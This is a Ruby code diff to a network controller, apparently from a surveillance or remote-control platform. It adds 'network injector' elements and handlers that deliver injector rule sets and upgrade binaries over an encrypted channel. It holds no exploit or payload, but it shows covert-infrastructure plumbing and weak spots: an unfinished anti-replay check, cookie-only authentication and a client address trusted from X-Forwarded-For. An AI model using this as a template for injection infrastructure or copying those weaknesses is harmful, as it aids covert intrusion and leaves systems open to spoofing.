@@ -3,8 +3,6 @@ require 'base64'
 require 'rcs-common/trace'
 require 'rcs-common/crypt'
 
-require_relative 'legacy_network_controller'
-
 module RCS
   module Controller
 
@@ -20,6 +18,7 @@ module RCS
         @http_uri = uri
         @http_content = content
         @http = http
+        @injectors = DB.instance.injectors
         @anonymizers = DB.instance.collectors
         @chain = parse_chain(@anonymizers)
       end
@@ -27,8 +26,10 @@ module RCS
       def act!
 
         case @http_method
+          # command from Console (thru DB)
           when 'PUSH'
             status, content = protocol_push
+          # command from network component
           when 'POST'
             status, content = protocol_post
         end
@@ -41,17 +42,9 @@ module RCS
 
         command = JSON.parse(@http_content)
 
-        # TODO: remove legacy code
+        trace :debug, "Received command: #{command.inspect}"
+        return protocol_send_command(command)
 
-        if command.has_key? 'command'
-          trace :debug, "Received command: #{command.inspect}"
-          return protocol_send_command(command)
-        else
-          trace :debug, "Received LEGACY element: #{command.inspect}"
-          return LegacyNetworkController.push(command)
-        end
-
-        return STATUS_SERVER_ERROR, "Bad push parsing"
       rescue Exception => e
         trace :error, "Cannot push to anonymizer: #{e.message}"
         trace :debug, e.backtrace.join("\n")
@@ -78,13 +71,13 @@ module RCS
 
       def protocol_decrypt(cookie, blob)
         # check that the cookie is valid and belongs to an anon
-        anon_from_cookie(cookie)
+        element_from_cookie(cookie)
 
-        trace :debug, "Anonymizer '#{@anon['name']}' is sending a command..."
+        trace :debug, "Network Element '#{@element['name']}' is sending a command..."
 
         # decrypt the blob
         blob = Base64.decode64(blob)
-        command = aes_decrypt(blob, @anon['key'])
+        command = aes_decrypt(blob, @element['key'])
         command = JSON.parse(command)
 
         # TODO: anti replay attack
@@ -94,14 +87,14 @@ module RCS
 
       def protocol_encrypt(cookie, command)
         # check that the cookie is valid and belongs to an anon
-        anon_from_cookie(cookie)
+        element_from_cookie(cookie)
 
-        trace :debug, "Sending command to anonymizer '#{@anon['name']}'..."
+        trace :debug, "Sending command to Network Element '#{@element['name']}'..."
 
         command = command.to_json
 
         # encrypt the message
-        blob = aes_encrypt(command, @anon['key'])
+        blob = aes_encrypt(command, @element['key'])
         blob = Base64.strict_encode64(blob)
 
         return blob
@@ -109,7 +102,7 @@ module RCS
 
       def protocol_execute_commands(commands)
 
-        trace :debug, "[#{@anon['name']}] Received command is: #{commands.inspect}"
+        trace :debug, "[#{@element['name']}] Received command is: #{commands.inspect}"
 
         # fallback to array if it's a single command
         commands = [commands] unless commands.is_a? Array
@@ -123,6 +116,10 @@ module RCS
               protocol_status(command, response)
             when 'LOG'
               protocol_log(command, response)
+            when 'CONFIG_REQUEST'
+              protocol_config(command, response)
+            when 'UPGRADE_REQUEST'
+              protocol_upgrade(command, response)
           end
         end
 
@@ -142,20 +139,59 @@ module RCS
         # symbolize keys
         stats = stats.inject({}){|h,(k,v)| h.merge({ k.to_sym => v}) }
 
-        name = 'RCS::ANON::' + @anon['name']
-        address = @anon['address']
+        # this element is an Anon, else is an Injector
+        if @element['type']
+          name = 'RCS::ANON::' + @element['name']
+          address = @element['address']
+
+          DB.instance.update_status name, address, status, msg, stats, 'anonymizer', version
+          DB.instance.update_collector_version(@element['_id'], version)
+        else
+          name = 'RCS::NI::' + @element['name']
+          # we don't have address for the NI, get it from the connection
+          address = @http[:x_forwarded_for]
+
+          DB.instance.update_status name, address, status, msg, stats, 'injector', version
+          DB.instance.update_injector_version(@element['_id'], version)
+        end
 
         trace :info, "[NC] [#{name}] #{address} #{status} #{msg}"
-        DB.instance.update_status name, address, status, msg, stats, 'anonymizer', version
-        DB.instance.update_collector_version(@anon['_id'], version)
 
         response << {command: 'STATUS', result: {status: 'OK'}}
       end
 
       def protocol_log(command, response)
         params = command['params']
-        DB.instance.collector_add_log(@anon['_id'], params['time'], params['type'], params['desc'])
+        if @element['type']
+          DB.instance.collector_add_log(@element['_id'], params['time'], params['type'], params['desc'])
+        else
+          DB.instance.injector_add_log(@element['_id'], params['time'], params['type'], params['desc'])
+        end
         response << {command: 'LOG', result: {status: 'OK'}}
+      end
+
+      def protocol_config(command, response)
+        content = DB.instance.injector_config(@element['_id'])
+
+        if content
+          trace :info, "[NC] New configuration for RCS::NI::#{@element['name']} (#{content.length} bytes)"
+          response << {command: 'CONFIG_REQUEST', result: {status: 'OK', msg: {type: 'rules', body: Base64.strict_encode64(content)}}}
+        else
+          trace :debug, "[NC] NO New configuration for RCS::NI::#{@element['name']}"
+          response << {command: 'CONFIG_REQUEST', result: {status: 'ERROR', msg: "No new config"}}
+        end
+      end
+
+      def protocol_upgrade(command, response)
+        content = DB.instance.injector_upgrade(@element['_id'])
+
+        if content
+          trace :info, "[NC] New upgrade for RCS::NI::#{@element['name']} (#{content.length} bytes)"
+          response << {command: 'UPGRADE_REQUEST', result: {status: 'OK', msg: {body: Base64.strict_encode64(content)}}}
+        else
+          trace :debug, "[NC] NO New upgrade for RCS::NI::#{@element['name']}"
+          response << {command: 'UPGRADE_REQUEST', result: {status: 'ERROR', msg: "No upgrade available"}}
+        end
       end
 
       def parse_chain(anonymizers)
@@ -249,7 +285,7 @@ module RCS
         # receive, check and decrypt a command
         reply = protocol_decrypt(cookie, resp.body)
 
-        trace :info, "Received response from '#{@anon['name']}': #{reply.inspect}"
+        trace :info, "Received response from '#{@element['name']}': #{reply.inspect}"
 
         # special case for 'CHECK' request
         if reply['command'].eql? 'STATUS'
@@ -272,9 +308,13 @@ module RCS
         return @chain.take_while {|x| not x['_id'].eql? anon['_id']}
       end
 
-      def anon_from_cookie(cookie)
-        @anon = @anonymizers.select { |x| x['cookie'].eql? cookie.split('=').last }.first
-        raise "Invalid cookie" unless @anon
+      def element_from_cookie(cookie)
+        # search for anon first
+        @element = @anonymizers.select { |x| x['cookie'].eql? cookie.split('=').last }.first
+        # then search for injectors
+        @element = @injectors.select { |x| x['cookie'].eql? cookie.split('=').last }.first unless @element
+        # not found
+        raise "Invalid cookie" unless @element
       end
 
     end
